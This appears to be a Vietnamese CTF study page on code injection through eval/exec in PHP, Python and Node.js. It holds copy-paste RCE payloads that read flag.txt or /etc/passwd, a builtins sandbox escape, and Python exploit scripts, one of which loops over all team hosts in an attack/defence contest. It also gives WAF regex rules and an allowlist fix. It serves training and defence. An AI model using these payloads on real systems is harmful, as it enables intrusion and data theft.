@@ -1,0 +1,509 @@
+<title>Code Injection (eval/exec) — Web CTF</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#ecebe4;--fg:#23211c;--muted:#6b665b;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--danger:#c0392b;--burp:#c2561a;--burp-soft:#f6e2d2;
+  --code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:760px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.62;font-size:16px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:40px 24px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(28px,6vw,42px);line-height:1.05;margin:.3em 0 .25em;letter-spacing:-.015em}
+.sub{color:var(--muted);font-size:17px;max-width:62ch}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:16px}
+.toc a{font-family:var(--font-mono);font-size:11px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 8px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(20px,4vw,26px);letter-spacing:-.01em;margin:0 0 2px}
+h3{font-family:var(--font-head);font-weight:600;font-size:16.5px;margin:20px 0 6px}
+section.block{padding-block:28px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:10px 0}strong{font-weight:600}a{color:var(--accent)}
+ul,ol{padding-left:21px;margin:9px 0}li{margin:5px 0}
+code{font-family:var(--font-mono);font-size:.86em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:12.5px;line-height:1.56;padding:14px;border-radius:11px;overflow-x:auto;margin:10px 0}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .n{color:#e8c56a}
+table{width:100%;border-collapse:collapse;margin:12px 0;font-size:13.5px}
+th,td{text-align:left;padding:8px 10px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.04em;color:var(--muted)}
+tr:last-child td{border-bottom:none}
+.lead{font-size:17.5px}
+.note{border-left:3px solid var(--mem);background:var(--surface);padding:11px 14px;border-radius:0 10px 10px 0;margin:14px 0;font-size:14px}
+.note .tag{font-family:var(--font-mono);font-size:10.5px;text-transform:uppercase;letter-spacing:.09em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.note.tip{border-color:var(--ok)}
+.note.warn{border-color:var(--danger)}
+.note.burp{border-color:var(--burp);background:var(--burp-soft)}
+.note.burp .tag{color:var(--burp)}
+.def{border:1px dashed var(--mem);background:var(--mem-soft);border-radius:10px;padding:10px 13px;margin:10px 0;font-size:13.5px}
+.def b{color:var(--mem)}
+.struct{display:flex;flex-direction:column;gap:1px;background:var(--line);border:1px solid var(--line);border-radius:12px;overflow:hidden;margin:12px 0}
+.srow{display:grid;grid-template-columns:30px 1fr;gap:10px;padding:10px 13px;background:var(--surface)}
+.srow .n{font-family:var(--font-mono);font-weight:700;color:var(--accent);font-size:13px}
+.srow .t{font-weight:600;font-size:14px}
+.srow .d{font-size:12.5px;color:var(--muted);margin-top:1px}
+.combatcard{border:2px solid var(--accent);border-radius:12px;overflow:hidden;margin:14px 0}
+.combatcard .ch{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:8px 14px;font-size:14px}
+.combatcard .cb{padding:4px 14px 10px}
+.cslot{padding:10px 0;border-bottom:1px solid var(--line);font-size:13.5px}
+.cslot:last-child{border-bottom:none}
+.cslot .lab{font-family:var(--font-mono);font-size:10.5px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;display:block;margin-bottom:4px}
+.pbreak{border:1px solid var(--line);border-radius:11px;overflow:hidden;margin:12px 0}
+.pbreak .ph{background:var(--surface-2);font-family:var(--font-mono);font-size:12.5px;padding:9px 13px;border-bottom:1px solid var(--line);word-break:break-word}
+.pbreak .pb{padding:10px 13px;font-size:13.5px}
+.pbreak .pb .part{margin:6px 0}
+.pbreak .pb .part code{background:var(--accent-soft);color:var(--accent);font-weight:600}
+.pbreak .resp{background:var(--ok-soft);padding:9px 13px;font-size:13px;border-top:1px dashed var(--line)}
+.pbreak .resp b{color:var(--ok)}
+.svgwrap{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:12px;margin:14px 0}
+.svgwrap svg{width:100%;height:auto;display:block}
+details{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:9px 13px;margin:8px 0;font-size:13.5px}
+summary{cursor:pointer;font-weight:600;color:var(--accent)}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer;opacity:.9}
+footer{padding-block:22px 40px;color:var(--muted);font-size:13px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">Web CTF · Code Injection (eval / exec)</div>
+    <h1>Code Injection qua eval/exec</h1>
+    <p class="sub">Khác với Command Injection (chạy lệnh HỆ ĐIỀU HÀNH) và SSTI (chạy cú pháp TEMPLATE ENGINE),
+    bài này nói về việc app gọi trực tiếp hàm <strong>thực thi mã nguồn của chính ngôn ngữ đang chạy</strong>
+    (PHP <code>eval()</code>, Python <code>eval()</code>/<code>exec()</code>, Node <code>eval()</code>/
+    <code>vm</code>, Perl <code>eval</code>) trên dữ liệu người dùng — bạn viết thẳng code ngôn ngữ đó, không
+    cần "thoát" khỏi cú pháp template nào cả.</p>
+    <div class="toc">
+      <a href="#combat">⚡ Combat</a><a href="#s00">00 Tóm tắt</a><a href="#s01">01 Nền tảng</a>
+      <a href="#s02">02 Vì sao</a><a href="#s03">03 Cơ chế</a><a href="#s04">04 Nhận diện</a>
+      <a href="#s05">05 Burp</a><a href="#s06">06 Payload theo ngôn ngữ</a><a href="#s07">07 Công cụ</a>
+      <a href="#s08">08 Script</a><a href="#s09">09 Ví dụ</a><a href="#s10">10 WAF</a>
+      <a href="#s11">11 Lỗi gặp</a><a href="#s12">12 Giới hạn</a><a href="#s13">13 Bài tập</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s00">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>Code Injection là gì?</h2>
+  <p class="lead">Nhiều ngôn ngữ có hàm đặc biệt nhận vào 1 CHUỖI TEXT và chạy nó như là <strong>code thật của
+  ngôn ngữ đó</strong> — PHP <code>eval($code)</code>, Python <code>eval(expr)</code>/<code>exec(code)</code>,
+  Node.js <code>eval(code)</code>. Những hàm này cực kỳ tiện cho dev (tính toán công thức động, "plugin" nhỏ...)
+  nhưng nếu chuỗi đưa vào có lẫn input người dùng, bạn viết thẳng code ngôn ngữ đó để chạy lệnh hệ thống.</p>
+  <div class="note tip"><span class="tag">Nếu chỉ nhớ một điều</span>
+  Luôn thử payload gây lỗi trước (<code>'"`\</code> hoặc 1 phép toán sai cú pháp) để xác nhận có eval thật không,
+  rồi mới leo thang lên RCE — đừng nhảy thẳng vào payload phức tạp khi chưa chắc có lỗ hổng.</div>
+ </div>
+</section>
+
+<!-- COMBAT CARD -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="secnum">⚡ COMBAT CARD — đọc trước, đủ để khai thác ngay</div>
+  <div class="combatcard">
+    <div class="ch">⚡ CODE INJECTION (EVAL/EXEC)</div>
+    <div class="cb">
+      <div class="cslot"><span class="lab">🚩 Nhận ra trong 30 giây</span>
+        Tính năng "máy tính công thức", "preview biểu thức", "custom filter/rule" nhận input text rồi trả ra kết
+        quả tính toán ⟹ rất khả nghi dùng <code>eval()</code> trực tiếp trên input.
+      </div>
+      <div class="cslot"><span class="lab">✅ Tiền đề cần có</span>
+        Biết (hoặc đoán đúng) ngôn ngữ backend (PHP/Python/Node) để chọn đúng cú pháp payload.
+      </div>
+      <div class="cslot"><span class="lab">🔍 Dò nhanh</span>
+        Gửi <code>1+1</code> → nếu kết quả trả về <code>2</code> ⟹ xác nhận có tính toán động (eval-like) thật.
+        Gửi tiếp <code>");system('id');//</code> (PHP) để kiểm tra có escape được không.
+      </div>
+      <div class="cslot"><span class="lab">💥 Payload dán-chạy-ngay (theo ngôn ngữ)</span>
+<pre><code><span class="c"># PHP eval()</span>
+");system('id');//
+
+<span class="c"># Python eval()</span>
+__import__('os').system('id')
+
+<span class="c"># Node.js eval()</span>
+require('child_process').execSync('id').toString()</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">🐍 Script khai thác (điền host, chạy)</span>
+<pre><code><span class="k">import</span> requests
+
+r = requests.post(<span class="s">"http://TARGET/calc"</span>,
+    data={<span class="s">"expr"</span>: <span class="s">"__import__('os').popen('cat flag.txt').read()"</span>})
+<span class="k">print</span>(r.text)</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">⚠️ Gotcha + 🛡️ WAF 1 dòng</span>
+        Nhiều app đã lọc 1 phần (chặn chữ <code>system</code>) nhưng quên các cách gọi khác
+        (<code>__import__</code>, backtick trong PHP, <code>pcntl_exec</code>) — luôn thử nhiều kiểu gọi khi 1
+        kiểu bị chặn. WAF rule nhanh: chặn các từ khoá <code>eval(</code>, <code>exec(</code>,
+        <code>__import__</code>, <code>system(</code>, <code>popen(</code> xuất hiện trong field không nên có
+        code. Chưa hiểu? đọc tiếp dưới.
+      </div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s01">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>Những thứ cần hiểu trước</h2>
+  <div class="def"><b>eval()</b> — hàm nhận 1 chuỗi, biên dịch và chạy nó NGAY LẬP TỨC như code thật của ngôn
+  ngữ đang chạy, trả về kết quả của biểu thức đó.</div>
+  <div class="def"><b>exec()</b> (Python) — giống <code>eval()</code> nhưng cho phép chạy cả CÂU LỆNH nhiều
+  dòng (if/for/import...), không chỉ 1 biểu thức, và không trả về giá trị.</div>
+  <p>Code hay viết (dev nghĩ chỉ dùng cho tính toán công thức số học đơn giản, quên mất người dùng có thể viết
+  bất cứ gì):</p>
+  <pre><code><span class="c">// PHP -- "máy tính" tính giá trị công thức</span>
+$result = eval(<span class="s">"return "</span> . $_GET[<span class="s">'formula'</span>] . <span class="s">";"</span>);</code></pre>
+  <pre><code><span class="c"># Python -- tương tự</span>
+result = eval(request.args.get(<span class="s">"formula"</span>))</code></pre>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s02">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO LỖ HỔNG TỒN TẠI</div>
+  <h2>Dev tin "chuỗi này chỉ là công thức số học"</h2>
+  <p>Dev nghĩ người dùng chỉ gõ những thứ như <code>2+2*3</code>, nên dùng <code>eval()</code> cho tiện (thay vì
+  tự viết 1 bộ phân tích công thức an toàn). Nhưng <code>eval()</code> không hề giới hạn — nó chạy được MỌI cú
+  pháp hợp lệ của ngôn ngữ, kể cả gọi hàm hệ thống, import thư viện, đọc file... Không có ranh giới nào giữa
+  "công thức số học" và "code nguy hiểm" trong mắt <code>eval()</code> — với nó, tất cả chỉ là code.</p>
+ </div>
+</section>
+
+<!-- 03 -->
+<section class="block" id="s03">
+ <div class="wrap">
+  <div class="secnum">03 / CƠ CHẾ HOẠT ĐỘNG ← MỤC LÕI</div>
+  <h2>Input của bạn = code thật, không cần "thoát" khỏi đâu cả</h2>
+  <div class="svgwrap">
+  <svg viewBox="0 0 680 165" xmlns="http://www.w3.org/2000/svg">
+    <style>
+      .lbl{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--fg)}
+      .lbl-m{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--muted)}
+      .lbl-a{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--accent);font-weight:700}
+      .box{fill:var(--surface);stroke:var(--line);stroke-width:1.5}
+      .box-a{fill:var(--accent-soft);stroke:var(--accent);stroke-width:1.5}
+      .arrow{stroke:var(--muted);stroke-width:1.5;fill:none;marker-end:url(#arr21)}
+    </style>
+    <defs><marker id="arr21" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+      <path d="M0,0 L6,3 L0,6 Z" fill="var(--muted)"/></marker></defs>
+    <rect x="10" y="20" width="200" height="55" rx="10" class="box"/>
+    <text x="22" y="40" class="lbl-m">input: formula=</text>
+    <text x="22" y="56" class="lbl-a">__import__('os').system(...)</text>
+
+    <path d="M210,48 H250" class="arrow"/>
+    <rect x="255" y="20" width="175" height="55" rx="10" class="box-a"/>
+    <text x="267" y="40" class="lbl-m">eval(formula)</text>
+    <text x="267" y="56" class="lbl-a">biên dịch &amp; CHẠY NGAY</text>
+
+    <path d="M430,48 H470" class="arrow"/>
+    <rect x="475" y="20" width="195" height="55" rx="10" class="box-a"/>
+    <text x="487" y="40" class="lbl-m">os.system(...) chạy</text>
+    <text x="487" y="56" class="lbl-a">RCE -- không có "thoát" gì cả</text>
+
+    <text x="22" y="110" class="lbl-m" font-style="italic">So sánh: SSTI phải "thoát" khỏi cú pháp template</text>
+    <text x="22" y="125" class="lbl-m" font-style="italic">trước ({{ }}), còn eval() nhận NGUYÊN CHUỖI làm code</text>
+    <text x="22" y="140" class="lbl-m" font-style="italic">ngay từ đầu -- không có lớp "template" ở giữa.</text>
+  </svg>
+  </div>
+  <p>Đây là điểm khác biệt quan trọng với <strong>SSTI</strong> (bài riêng): SSTI phải tìm cách thoát khỏi cú
+  pháp template engine (`{{ }}`, `${ }`...) trước khi chạm được tới code thật. Với <code>eval()</code> trực
+  tiếp, không có lớp template nào ở giữa — chuỗi bạn gửi CHÍNH LÀ code được chạy, không cần "thoát" gì cả.</p>
+ </div>
+</section>
+
+<!-- 04 -->
+<section class="block" id="s04">
+ <div class="wrap">
+  <div class="secnum">04 / NHẬN DIỆN KHI GẶP CHALLENGE</div>
+  <h2>Những chức năng hay ẩn eval()</h2>
+  <ul>
+    <li>Máy tính / công cụ tính biểu thức toán học động.</li>
+    <li>Bộ lọc dữ liệu tùy chỉnh ("custom filter rule", "advanced search query") cho người dùng tự viết điều kiện.</li>
+    <li>Tính năng "preview code" / "playground" chạy đoạn code nhỏ do người dùng nhập (rõ ràng nhất).</li>
+    <li>Tham số cấu hình động đọc từ file/DB rồi "chạy" lại (ít gặp hơn, nhưng nguy hiểm tương tự).</li>
+  </ul>
+  <p>Test nhanh: gửi 1 phép toán hợp lệ (<code>7*7</code>) — nếu trả về <code>49</code> đúng, khả năng cao là
+  <code>eval()</code> thật, không phải chỉ parse số đơn giản.</p>
+ </div>
+</section>
+
+<!-- 05 -->
+<section class="block" id="s05">
+ <div class="wrap">
+  <div class="secnum">05 / KHAI THÁC BẰNG BURP SUITE</div>
+  <h2>Bấm gì (từng bước)</h2>
+  <div class="note burp"><span class="tag">Dò bằng Repeater</span>
+  <ol style="margin:4px 0 0">
+    <li>Bắt request chứa tham số công thức/biểu thức nghi ngờ, Send to Repeater.</li>
+    <li>Thử lần lượt: số thường (<code>7*7</code>) → ký tự đặc biệt gây lỗi cú pháp (<code>'"\);</code>) → nếu
+    response trả lỗi cú pháp của NGÔN NGỮ (không phải lỗi app chung) ⟹ xác nhận eval thật, và tên ngôn ngữ thường
+    lộ ra trong thông báo lỗi.</li>
+    <li>Dán payload RCE tương ứng (mục 06), so sánh response trước/sau.</li>
+  </ol></div>
+ </div>
+</section>
+
+<!-- 06 -->
+<section class="block" id="s06">
+ <div class="wrap">
+  <div class="secnum">06 / PAYLOAD CATALOG THEO NGÔN NGỮ</div>
+  <h2>Bảng payload copy-dán theo ngôn ngữ backend</h2>
+
+  <h3>A. PHP <code>eval()</code></h3>
+  <div class="pbreak">
+    <div class="ph">");system('id');//</div>
+    <div class="pb">
+      <div class="part"><code>");</code> — đóng câu lệnh PHP hiện tại (giả định code gốc dạng <code>return
+      ...;</code>)</div>
+      <div class="part"><code>system('id')</code> — câu lệnh PHP mới, chạy lệnh hệ thống</div>
+      <div class="part"><code>//</code> — comment, vô hiệu hoá phần code gốc còn lại sau payload</div>
+    </div>
+    <div class="resp">Response: <b>trả ra output của lệnh <code>id</code></b> trong kết quả trang nếu PHP echo
+    lại giá trị eval trả về.</div>
+  </div>
+  <p>Biến thể không dùng <code>system</code> (nếu bị chặn từ khóa): <code>passthru('id')</code>,
+  <code>shell_exec('id')</code>, hoặc backtick PHP <code>`id`</code>.</p>
+
+  <h3>B. Python <code>eval()</code>/<code>exec()</code></h3>
+  <div class="pbreak">
+    <div class="ph">__import__('os').popen('cat flag.txt').read()</div>
+    <div class="pb">
+      <div class="part"><code>__import__('os')</code> — import module <code>os</code> mà không cần cú pháp
+      <code>import</code> (vì <code>eval()</code> chỉ chạy được BIỂU THỨC, không chạy được câu lệnh
+      <code>import</code>)</div>
+      <div class="part"><code>.popen('cat flag.txt').read()</code> — chạy lệnh shell, đọc toàn bộ output</div>
+    </div>
+    <div class="resp">Response: <b>nội dung file flag.txt</b> nếu giá trị <code>eval()</code> được trả lại cho
+    người dùng.</div>
+  </div>
+  <div class="note warn"><span class="tag">Nếu app chặn builtins</span>Nhiều app "tự vệ" bằng cách gọi
+  <code>eval(expr, {"__builtins__": {}})</code> để chặn <code>__import__</code>. Thử bypass bằng cách lấy lại
+  builtins qua chuỗi class cha: <code>().__class__.__base__.__subclasses__()</code> — tìm 1 class có quyền truy
+  cập file/os trong danh sách subclass trả về (kỹ thuật "sandbox escape", khá nâng cao, không phải lúc nào cũng
+  cần ở Bảng C).</div>
+
+  <h3>C. Node.js <code>eval()</code></h3>
+  <div class="pbreak">
+    <div class="ph">require('child_process').execSync('cat flag.txt').toString()</div>
+    <div class="pb">
+      <div class="part"><code>require('child_process')</code> — import module chạy lệnh hệ thống của Node</div>
+      <div class="part"><code>.execSync(...).toString()</code> — chạy lệnh, chuyển kết quả buffer sang chuỗi để trả về</div>
+    </div>
+    <div class="resp">Response: <b>nội dung file flag.txt</b> nếu Node echo lại giá trị eval trả ra.</div>
+  </div>
+ </div>
+</section>
+
+<!-- 07 -->
+<section class="block" id="s07">
+ <div class="wrap">
+  <div class="secnum">07 / CÔNG CỤ HỖ TRỢ</div>
+  <h2>Không cần công cụ chuyên dụng — chủ yếu là bảng payload</h2>
+  <p>Khác các bài khác, Code Injection qua <code>eval()</code> không cần công cụ sinh payload tự động
+  (PHPGGC/sqlmap-style) — payload ngắn, viết tay trực tiếp theo mục 06 là đủ. Tham khảo thêm payload biến thể
+  tại PayloadsAllTheThings (đã có offline ở <code>~/hoc/CTF/Tools/web/PayloadsAllTheThings/</code>), thư mục
+  <code>Server Side Template Injection</code> và <code>Code Injection</code> có vài ví dụ chung với SSTI.</p>
+ </div>
+</section>
+
+<!-- 08 -->
+<section class="block" id="s08">
+ <div class="wrap">
+  <div class="secnum">08 / VIẾT SCRIPT KHAI THÁC (3 BẢN)</div>
+  <h2>Từ tay-gõ-Burp sang script tự động</h2>
+
+  <h3>(A) Bản thủ công — để HIỂU từng bước</h3>
+  <pre><code><span class="k">import</span> requests
+
+<span class="c"># Bước 1: xác nhận eval thật bằng phép toán đơn giản</span>
+r = requests.post(<span class="s">"http://TARGET/calc"</span>, data={<span class="s">"formula"</span>: <span class="s">"7*7"</span>})
+<span class="k">assert</span> <span class="s">"49"</span> <span class="k">in</span> r.text, <span class="s">"không phải eval thật"</span>
+
+<span class="c"># Bước 2: leo thang RCE</span>
+payload = <span class="s">"__import__('os').popen('cat flag.txt').read()"</span>
+r = requests.post(<span class="s">"http://TARGET/calc"</span>, data={<span class="s">"formula"</span>: payload})
+<span class="k">print</span>(r.text)</code></pre>
+
+  <h3>(B) Bản gọn chắc — trích thẳng flag, thử nhiều payload nếu 1 bị chặn</h3>
+  <pre><code><span class="k">import</span> re, requests
+
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+PAYLOADS = [
+    <span class="s">"__import__('os').popen('cat flag.txt').read()"</span>,
+    <span class="s">"().__class__.__base__.__subclasses__()"</span>,  <span class="c"># fallback nếu builtins bị chặn (cần soi tay)</span>
+]
+
+<span class="k">def</span> <span class="d">exploit_eval</span>(host):
+    <span class="k">for</span> p <span class="k">in</span> PAYLOADS:
+        r = requests.post(<span class="s">f"http://{host}/calc"</span>, data={<span class="s">"formula"</span>: p}, timeout=5)
+        m = FLAG_RE.search(r.text)
+        <span class="k">if</span> m:
+            <span class="k">return</span> m.group()
+    <span class="k">return</span> <span class="k">None</span>
+
+<span class="k">print</span>(<span class="s">"FLAG:"</span>, exploit_eval(<span class="s">"TARGET_IP"</span>))</code></pre>
+
+  <h3>(C) Bản A/D tái dùng — chạy vòng quanh mọi đội</h3>
+  <pre><code><span class="k">import</span> re, requests
+
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+PAYLOAD = <span class="s">"__import__('os').popen('cat flag.txt').read()"</span>
+
+<span class="k">def</span> <span class="d">exploit_eval</span>(host):
+    <span class="k">try</span>:
+        r = requests.post(<span class="s">f"http://{host}/calc"</span>, data={<span class="s">"formula"</span>: PAYLOAD}, timeout=5)
+        m = FLAG_RE.search(r.text)
+        <span class="k">return</span> m.group() <span class="k">if</span> m <span class="k">else</span> <span class="k">None</span>
+    <span class="k">except</span> requests.RequestException:
+        <span class="k">return</span> <span class="k">None</span>
+
+<span class="k">if</span> __name__ == <span class="s">"__main__"</span>:
+    <span class="k">for</span> host <span class="k">in</span> open(<span class="s">"teams.txt"</span>).read().split():
+        flag = exploit_eval(host)
+        <span class="k">if</span> flag:
+            <span class="k">print</span>(<span class="s">f"{host} {flag}"</span>)
+            <span class="k">with</span> open(<span class="s">"flags.txt"</span>, <span class="s">"a"</span>) <span class="k">as</span> f:
+                f.write(<span class="s">f"{flag}\n"</span>)</code></pre>
+ </div>
+</section>
+
+<!-- 09 -->
+<section class="block" id="s09">
+ <div class="wrap">
+  <div class="secnum">09 / VÍ DỤ THỰC TẾ END-TO-END</div>
+  <h2>Từ nhận service tới lấy flag</h2>
+  <div class="struct">
+    <div class="srow"><span class="n">1</span><div><div class="t">Recon</div><div class="d">Service có tính năng "Price Calculator" nhận công thức tính giảm giá, trả ra kết quả số.</div></div></div>
+    <div class="srow"><span class="n">2</span><div><div class="t">Xác nhận eval</div><div class="d">Gửi <code>7*7</code> → response hiện <code>49</code> ⟹ xác nhận tính toán động thật, không phải regex parse đơn giản.</div></div></div>
+    <div class="srow"><span class="n">3</span><div><div class="t">Xác định ngôn ngữ</div><div class="d">Gửi ký tự lỗi cú pháp <code>'"\);</code> → response lộ traceback <code>Traceback (most recent call last)...</code> ⟹ Python.</div></div></div>
+    <div class="srow"><span class="n">4</span><div><div class="t">RCE</div><div class="d">Gửi <code>__import__('os').popen('id').read()</code> → response hiện output <code>uid=...</code> ⟹ RCE xác nhận.</div></div></div>
+    <div class="srow"><span class="n">5</span><div><div class="t">Lấy flag</div><div class="d">Đổi lệnh thành <code>cat flag.txt</code>, gửi lại → response hiện <code>FHACKER2026{...}</code>.</div></div></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / PHÒNG THỦ: VIẾT WAF RULE</div>
+  <h2>Chặn đúng payload, không chặn nhầm request thường</h2>
+  <table>
+    <tr><th>Rule (regex)</th><th>Khớp gì</th></tr>
+    <tr><td><code>__import__\s*\(</code></td><td>Cách gọi import ẩn trong biểu thức Python</td></tr>
+    <tr><td><code>\b(system|exec|popen|passthru|shell_exec)\s*\(</code></td><td>Các hàm chạy lệnh hệ thống phổ biến đa ngôn ngữ</td></tr>
+    <tr><td><code>__class__|__subclasses__|__base__</code></td><td>Kỹ thuật "sandbox escape" qua chuỗi class cha trong Python</td></tr>
+    <tr><td><code>require\s*\(\s*['"]child_process['"]</code></td><td>Node.js import module chạy lệnh hệ thống</td></tr>
+  </table>
+  <div class="note warn"><span class="tag">Giới hạn thực tế</span>Nếu field này VỐN DÙNG cho người dùng nhập
+  công thức toán học hợp lệ (không nên có chữ cái/hàm), cân nhắc đơn giản là chỉ cho phép ký tự số và các toán
+  tử cơ bản (<code>^[0-9+\-*/(). ]+$</code>) ngay từ phía app — đây là fix đúng cách (allowlist), còn WAF chỉ là
+  lớp chặn tạm khi chưa sửa được code.</div>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LỖI THƯỜNG GẶP & GỠ</div>
+  <h2>Khi payload không chạy</h2>
+  <table>
+    <tr><th>Triệu chứng</th><th>Nguyên nhân</th><th>Cách sửa</th></tr>
+    <tr><td>Response trả lỗi "NameError: name 'os' is not defined"</td><td>App đã chặn builtins (<code>eval(expr, {"__builtins__": {}})</code>)</td><td>Dùng kỹ thuật "sandbox escape" qua <code>().__class__.__base__.__subclasses__()</code> (mục 06.B)</td></tr>
+    <tr><td>Payload PHP không chạy, lỗi parse error</td><td>Code gốc không đúng dạng <code>return ...;</code> như giả định — cấu trúc câu lệnh gốc khác</td><td>Thử nhiều cách đóng câu khác nhau: <code>1);system('id');//</code>, <code>';system('id');//</code></td></tr>
+    <tr><td>Output không hiện ra trên response</td><td>App chạy <code>exec()</code> (không trả giá trị) chứ không phải <code>eval()</code>, hoặc không echo kết quả ra</td><td>Dùng kỹ thuật blind — ghi output ra file rồi đọc qua request khác, hoặc dùng OOB (DNS/HTTP callback)</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / NHẬN DIỆN & GIỚI HẠN</div>
+  <h2>Khi nào ĐƯỢC / KHÔNG dùng</h2>
+  <table>
+    <tr><th></th><th>Tình huống</th></tr>
+    <tr><td>✅</td><td>App gọi trực tiếp <code>eval()</code>/<code>exec()</code> của chính ngôn ngữ backend trên dữ liệu người dùng, không qua lớp template engine nào.</td></tr>
+    <tr><td>❌</td><td>App dùng template engine (Jinja2, Twig...) để render — đó là SSTI (bài riêng), cách thoát khác, không dùng payload <code>eval()</code> trực tiếp ở đây.</td></tr>
+    <tr><td>❌</td><td>App đã dùng thư viện parser công thức an toàn chuyên dụng (vd <code>asteval</code>, <code>mathjs</code> với sandbox đúng cách) — không có <code>eval()</code> thật ở phía dưới.</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 13 -->
+<section class="block" id="s13">
+ <div class="wrap">
+  <div class="secnum">13 / BÀI TẬP & THUẬT NGỮ</div>
+  <h2>Luyện tập</h2>
+  <p>⭐ <strong>Làm lại:</strong> dựng 1 Flask app nhỏ có route <code>/calc</code> dùng
+  <code>eval(request.args.get("formula"))</code>, tự khai thác lấy nội dung 1 file trên máy.</p>
+  <details><summary>Gợi ý nếu kẹt</summary><code>__import__('os').popen('cat /etc/passwd').read()</code> rồi
+  truyền qua query string, nhớ URL-encode dấu cách.</details>
+
+  <p>⭐⭐ <strong>Đổi 1 biến:</strong> thêm <code>{"__builtins__": {}}</code> vào app Flask trên, thử lại payload
+  cũ (sẽ lỗi), rồi tìm payload bypass bằng <code>__class__.__base__.__subclasses__()</code>.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>In toàn bộ danh sách subclass ra trước để tìm đúng index của class có
